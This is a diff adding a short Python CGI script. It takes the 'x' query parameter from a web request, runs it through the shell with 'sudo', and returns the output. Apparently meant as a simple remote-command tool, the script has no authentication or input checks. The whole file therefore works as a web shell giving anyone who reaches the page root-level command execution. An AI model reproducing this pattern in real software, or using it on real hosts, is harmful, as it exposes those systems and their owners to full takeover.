@@ -1,0 +1,13 @@
+#!/usr/bin/python3
+import cgi
+import subprocess as sub
+
+
+print("content-type:  text/html")
+print()
+
+y=cgi.FieldStorage()
+cmd=y.getvalue("x")
+
+y=sub.getoutput("sudo " + cmd);
+print(y)
